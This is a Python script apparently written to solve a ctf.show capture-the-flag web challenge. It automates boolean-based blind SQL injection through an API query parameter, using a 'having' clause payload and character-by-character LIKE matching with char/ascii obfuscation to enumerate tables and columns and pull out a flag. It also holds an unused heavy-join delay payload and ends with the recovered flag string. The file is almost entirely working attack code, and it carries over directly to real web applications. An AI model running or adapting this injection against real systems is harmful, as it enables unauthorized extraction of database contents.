import requests,json,datetime
url='http://488c5bb5-bcef-458a-86b1-592229fcc087.chall.ctf.show/api/?u='
def chk(pl):
    data = {
        'ip':"1) or(if(({}),((SELECT count(*) FROM information_schema.columns A, information_schema.columns B,mysql.user )),1))#".format(pl),
        'debug':'1'
    }
    pl="pass having pass='ctfshow' and({})-- -".format(pl)
   # print(data['ip'])

    r=json.loads(requests.get(url+pl).text)
    return '查询成功' in r['msg']

print(chk('select(true)'),chk('select(false)'))
Alphabet = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'j', 'h', 'i', 'g', 'k',
            'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',
            'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '?',
            '!', ',', '|', '[', ']', '{', '}', '/', '*', '-', '+', '&', "%", '#', '@', '$', '~', '_', ]
table=''

def bi(pl='table_name',plf=' from information_schema.tables where table_schema=database()',ret='',l=42):
    def mkpl(s=''):
        ret ='concat('
        for i in s:
            ret += "char(ascii('{}')-(true<<pi()<<true)),".format(chr(ord(i)+16))
        ret+="'%')"
        return ret

    for i in range (len(ret)+1,1+l):
        print('\n',format(ret,'%ds'%l),end='')
        for j in Alphabet:

            pl_gnr="select {} like {} {}".format(pl,mkpl(ret+j),plf)
            #print(pl_gnr)
            print(j,end='')
            if(chk(pl_gnr)):
                ret+=j
                break
    print('\nret=', ret)
    return ret


#bi(plf=" from information_schema.tables where  table_name like 'ctfshow_flag%'", ret='ctfshow_flag')#爆表
#bi('(column_name)'," from(information_schema.columns)where(table_name = 'ctfshow_flagas' and column_name like 'flag%')",'flag') # 爆字段
Alphabet='0123456789-abcdef{}gl_'
bi('flagasabc',' from  ctfshow_flagas',) #爆flag

'flag{1da68e44-e985-4454xb45c-eb2a2947ab54}'